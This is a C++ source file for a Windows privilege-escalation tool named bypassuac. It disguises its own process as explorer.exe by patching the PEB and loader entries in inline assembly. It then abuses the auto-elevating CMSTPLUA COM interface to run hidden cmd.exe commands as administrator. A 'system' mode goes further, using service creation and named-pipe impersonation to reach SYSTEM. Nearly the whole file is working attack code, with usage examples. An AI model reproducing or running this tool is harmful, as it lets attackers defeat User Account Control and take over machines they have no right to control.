// bypassuac.cpp: 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include <Shobjidl.h>
#include "windows.h"
#include "winternl.h"
#include <iostream>
#include "priv.h"


using namespace std;

typedef interface ICMLuaUtil ICMLuaUtil;
typedef struct ICMLuaUtilVtbl {

	BEGIN_INTERFACE

	HRESULT(STDMETHODCALLTYPE *QueryInterface)(
		__RPC__in ICMLuaUtil * This,
		__RPC__in REFIID riid,
		_COM_Outptr_  void **ppvObject);

	ULONG(STDMETHODCALLTYPE *AddRef)(
		__RPC__in ICMLuaUtil * This);

	ULONG(STDMETHODCALLTYPE *Release)(
		__RPC__in ICMLuaUtil * This);

	HRESULT(STDMETHODCALLTYPE *Method1)(
		__RPC__in ICMLuaUtil * This);

	HRESULT(STDMETHODCALLTYPE *Method2)(
		__RPC__in ICMLuaUtil * This);

	HRESULT(STDMETHODCALLTYPE *Method3)(
		__RPC__in ICMLuaUtil * This);

	HRESULT(STDMETHODCALLTYPE *Method4)(
		__RPC__in ICMLuaUtil * This);

	HRESULT(STDMETHODCALLTYPE *Method5)(
		__RPC__in ICMLuaUtil * This);

	HRESULT(STDMETHODCALLTYPE *Method6)(
		__RPC__in ICMLuaUtil * This);

	HRESULT(STDMETHODCALLTYPE *ShellExec)(
		__RPC__in ICMLuaUtil * This,
		_In_     LPCTSTR lpFile,
		_In_opt_  LPCTSTR lpParameters,
		_In_opt_  LPCTSTR lpDirectory,
		_In_      ULONG fMask,
		_In_      ULONG nShow
		);

	HRESULT(STDMETHODCALLTYPE *SetRegistryStringValue)(
		__RPC__in ICMLuaUtil * This,
		_In_      HKEY hKey,
		_In_opt_  LPCTSTR lpSubKey,
		_In_opt_  LPCTSTR lpValueName,
		_In_      LPCTSTR lpValueString
		);

	HRESULT(STDMETHODCALLTYPE *Method9)(
		__RPC__in ICMLuaUtil * This);

	HRESULT(STDMETHODCALLTYPE *Method10)(
		__RPC__in ICMLuaUtil * This);

	HRESULT(STDMETHODCALLTYPE *Method11)(
		__RPC__in ICMLuaUtil * This);

	HRESULT(STDMETHODCALLTYPE *Method12)(
		__RPC__in ICMLuaUtil * This);

	HRESULT(STDMETHODCALLTYPE *Method13)(
		__RPC__in ICMLuaUtil * This);

	HRESULT(STDMETHODCALLTYPE *Method14)(
		__RPC__in ICMLuaUtil * This);

	HRESULT(STDMETHODCALLTYPE *Method15)(
		__RPC__in ICMLuaUtil * This);

	HRESULT(STDMETHODCALLTYPE *Method16)(
		__RPC__in ICMLuaUtil * This);

	HRESULT(STDMETHODCALLTYPE *Method17)(
		__RPC__in ICMLuaUtil * This);

	HRESULT(STDMETHODCALLTYPE *Method18)(
		__RPC__in ICMLuaUtil * This);

	HRESULT(STDMETHODCALLTYPE *Method19)(
		__RPC__in ICMLuaUtil * This);

	HRESULT(STDMETHODCALLTYPE *Method20)(
		__RPC__in ICMLuaUtil * This);

	END_INTERFACE

} *PICMLuaUtilVtbl;

interface ICMLuaUtil
{
	CONST_VTBL struct ICMLuaUtilVtbl *lpVtbl;
};


HRESULT fn_call_CMSTPLUA_shellexecute(LPCWSTR lpCmdline) {

	HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);
	ICMLuaUtil *CMLuaUtil = NULL;
	IID xIID_ICMLuaUtil;
	LPCWSTR lpIID = L"{6EDD6D74-C007-4E75-B76A-E5740995E24C}";
	IIDFromString(lpIID, &xIID_ICMLuaUtil);
	BIND_OPTS3 bop;

	ZeroMemory(&bop, sizeof(bop));

	if (!SUCCEEDED(hr))
		return hr;


	bop.cbStruct = sizeof(bop);
	bop.dwClassContext = CLSCTX_LOCAL_SERVER;
	hr = CoGetObject(L"Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}", (BIND_OPTS *)&bop, xIID_ICMLuaUtil, (VOID**)&CMLuaUtil);
	
	if (hr != S_OK)
		return  hr;

	
	hr = CMLuaUtil->lpVtbl->ShellExec(CMLuaUtil, L"cmd.exe", lpCmdline, NULL, SEE_MASK_DEFAULT, SW_HIDE);
	if (CMLuaUtil != NULL) {
		CMLuaUtil->lpVtbl->Release(CMLuaUtil);
	}
	
	
	return hr;
}



PPEB fn_get_peb_via_NtQueryInformationProcess() {

	typedef NTSTATUS(WINAPI *NtQueryInformationProcess)(HANDLE, DWORD, PVOID, ULONG, PULONG);
	DWORD dwProcessId = GetCurrentProcessId();
	PROCESS_BASIC_INFORMATION processInfo;
	PPEB ppeb = NULL;


	HMODULE hLoadDll = LoadLibrary(L"ntdll.dll");
	NtQueryInformationProcess ntqip = (NtQueryInformationProcess)GetProcAddress(hLoadDll, "NtQueryInformationProcess");
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);


	if (hProcess != NULL) {

		NTSTATUS status = ntqip(hProcess, ProcessBasicInformation, &processInfo, sizeof(PROCESS_BASIC_INFORMATION), NULL);
		if (NT_SUCCESS(status)) {

			ppeb = processInfo.PebBaseAddress;
			
		}
		else {
			CloseHandle(hProcess);
			return FALSE;
		}
	}
	CloseHandle(hProcess);
	return ppeb;
}



VOID fn_change_ProcessParameters_and_LDR(PUNICODE_STRING name,LPCWSTR lpExplorePath) {

	typedef VOID(WINAPI *RtlInitUnicodeString)(_Inout_  PUNICODE_STRING DestinationString, _In_opt_ PCWSTR SourceString);
	RtlInitUnicodeString pfnRtlInitUnicodeString = NULL;

	
	HMODULE hDll = LoadLibrary(L"ntdll.dll");
	pfnRtlInitUnicodeString = (RtlInitUnicodeString)GetProcAddress(hDll, "RtlInitUnicodeString");

	
	pfnRtlInitUnicodeString(name, lpExplorePath);
	// same initial UnicodeString length and MaximumLength.
}


int main()
{

	HANDLE hMutex = CreateMutex(NULL, FALSE, L"bypassuac_mutex");
	if (GetLastError() == ERROR_ALREADY_EXISTS) {
		CloseHandle(hMutex);
		fn_create_service();
		fn_impersonate_via_namepipe();
		fn_delete_service();
		return 0;

	}
	
	

	int nArgs = 0;
	LPWSTR *lpParam = NULL;
	LPWSTR lpExplorePath = new WCHAR[MAX_PATH];
	WCHAR chCurrentProgName[MAX_PATH] = L"/c ";
	HRESULT hr = NULL;
	PPEB ppeb = NULL;
	DWORD *dwpFullDllName = NULL,
		*dwpBaseDllName = NULL;


	lpParam = CommandLineToArgvW(GetCommandLine(), &nArgs);	
	if (nArgs <= 1) {
		cout << "[!] Usage: bypassuac.exe [cmdline]\n";
		cout << "[!] Example : bypassuac.exe \"/c echo 1 >> c:\\\\test \"" << endl;
		cout << "[!] Example : bypassuac.exe system" << endl;
		return 0;
	}
	
	
	GetModuleFileName(NULL, chCurrentProgName + 3, MAX_PATH);
	RtlSecureZeroMemory(lpExplorePath, sizeof(lpExplorePath));
	GetWindowsDirectory(lpExplorePath, MAX_PATH);
	lstrcat(lpExplorePath, L"\\explorer.exe");
	

	ppeb = fn_get_peb_via_NtQueryInformationProcess();
	if (ppeb != FALSE )
	{
		__asm {
			mov eax,fs:[0x30]
			mov ppeb,eax
		}
	}
	// if NtQueryInformationProcess fails.  get peb addr via fs	


	
	__asm {
		push eax

		mov eax, fs:[0x30]		// PEB
		mov eax, [eax + 0x0c]   // LDR  
		mov eax, [eax + 0x0c]   // InLoadOrderModuleList.Flink  -> LDR_DATA_TABLE_ENTRY.InLoadOrderLinks
		
		add eax, 0x24			// FullDllName
		mov dwpFullDllName,eax

		sub eax, 0x24
		add eax, 0x2c			// BaseDllName
		mov dwpBaseDllName,eax 
		
		pop eax
		
	}
	
	
	

	fn_change_ProcessParameters_and_LDR(&ppeb->ProcessParameters->ImagePathName, lpExplorePath);
	fn_change_ProcessParameters_and_LDR(&ppeb->ProcessParameters->CommandLine, lpExplorePath);
	fn_change_ProcessParameters_and_LDR((PUNICODE_STRING)((unsigned char *)dwpFullDllName), lpExplorePath);
	fn_change_ProcessParameters_and_LDR((PUNICODE_STRING)((unsigned char *)dwpBaseDllName), L"explorer.exe");
	// patch peb

	cout <<  "[+] patch peb success" << endl;
	wcout << "[+] ldr - > FullDllName :" << (LPWSTR)(((PUNICODE_STRING)((unsigned char *)dwpFullDllName))->Buffer) << endl;
	wcout << "[+] ldr - > BaseDllName :" << (LPWSTR)(((PUNICODE_STRING)((unsigned char *)dwpBaseDllName))->Buffer) <<endl;
	wcout << "[+] ImagePathName is :" <<ppeb->ProcessParameters->ImagePathName.Buffer << endl;
	wcout << "[+] CommandLine is   :" <<ppeb->ProcessParameters->CommandLine.Buffer << endl;

	
	if( lstrcmp(*(lpParam+1),L"system") == 0)
		hr = fn_call_CMSTPLUA_shellexecute(chCurrentProgName);
	else
		hr = fn_call_CMSTPLUA_shellexecute(*(lpParam + 1));
	
	if (SUCCEEDED(hr))
		cout << "[!] successful" << endl;
	Sleep(1000); // for mutex

    return 0;
}




